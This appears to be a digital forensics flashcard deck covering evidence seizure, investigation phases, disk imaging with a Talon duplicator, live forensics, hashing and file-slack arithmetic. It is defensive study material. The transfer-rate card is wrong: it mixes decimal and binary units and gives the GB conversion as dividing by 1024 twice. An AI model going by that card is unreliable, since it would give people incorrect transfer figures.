Procedure before live forensics,"Don't unplug the power, isolate the system, plan and identify possible locations where data can be found."
Procedure/steps for collecting and preserving electronic evidence,"<ol><li>If the device is on, unplug the power cable from the device. This will ""freeze"" the media/hard drive in its current state. This should not be done for UNIX based systema or MS Exchange servers as serious file system damage could occur. Use the normal shutdown procedure. If it's a laptop, unplug the power cord and the battery.</li><li>Remove storage devices from the computer (e.g. hard drives, solid-state drives (SSD))</li><li>Store storage devices into anti-static evidence bags.</li><li>Seal the computer by placing evidence tape along the computer's housing, as well as ports on the computer.</li></ul>"
Process of Forensic Investigation,"<ol><li><b>Assessment:</b> Computer forensic examiners should assess digital evidence thoroughly with respect to the scope of the case to determine the course of action to take.</li><li><b>Acquisition:</b> Digital evidence, by its very nature, is fragile and can be altered, damaged, or destroyed by improper handling or examination. Examination is best conducted on a copy of the original evidence. The original evidence should be acquired in a manner that protects and preserves the integrity of the evidence.</li><li><b>Examination:</b> The purpose of the examination process is to extract and analyze digital evidence. Extraction refers to the recovery of data from its media. Analysis refers to the interpretation of the recovered data and putting it in a logical and useful format.</li><li><b>Documenting and Reporting:</b> Actions and observations should be documented throughout the forensic processing of evidence. This will conclude with the preparation of a written report of the findings.</li></ol>"
Redline purposes,"Audit and collect all running processes and drivers from memory, file-system metadata, registry data, event logs, network info, services, tasks and web history."

Selecting destination hard disk and ports,Selecting the most appropiate drive for bit-stream imaging:<ul><li>Size must be larger than or equal to the size of the source disk.</li><li>SSDs are better than HDDs as they have no moving parts and thus less risk of being damaged in transport.</li><li>Try to have a disk with the smallest size as possible as larger capacity means longer time for wiping and hashing.</li></ul>
Steps to use Talon duplicator,<ol><li>Connect Disk A (Suspect) and Disk C (Destination) to the source and destination ports of the Talon Duplicator using SATA cables respectively.</li><li>Ensure that drive to drive/image mode is selected.</li><li>Select the hashing algorithm (usually MD5).</li><li>Perform a wipe on the destination disk.</li><li>Start duplication</li></ol>

When to do live forensics?,If the system needs to be kept running and the response team used the OS and other local applications to view log files and account information. See Why Live Forensics for reasons.
Which of the following file extensions are considered to be forensically examinable disk image formats?,.aff and .e01
Which of the following statement is TRUE with regards to hashing?,Compressing a file will result in a change to its hash value.
Why live forensics?,If there is no suitable media (e.g. server too big) or no time to do bit-stream imaging.
Calculation of Duplication/Transfer Rate,"<ol><li>Convert the size of the disk to bytes. MB is 10^6, GB is 10^9, and so on. Example: 640 GB = 640,000,000,000 Bytes</li><li>Convert time for transfer to seconds</li><li>Divide the size in bytes by the time in seconds</li><li>Convert to suitable units by dividing by 1024. MB is /1024/1024, GB is /1024/1024, and so on.</li></ol>"
Calculation of File Slack,"File slack is the space between the end of a file and the end of the last cluster used by that file.<br><br>Example:<br>Consider an NTFS file system with a 2048-byte cluster and 512-byte sectors. A file of 2543 bytes resides in 2 clusters.<br>To calculate the size of the file slack, since the file takes up 1 entire cluster and has some left, we use that remaining file size to subtract from the size of the remaining cluster.<br><i>2048 - (2543-2048) = 1553 bytes<i>"
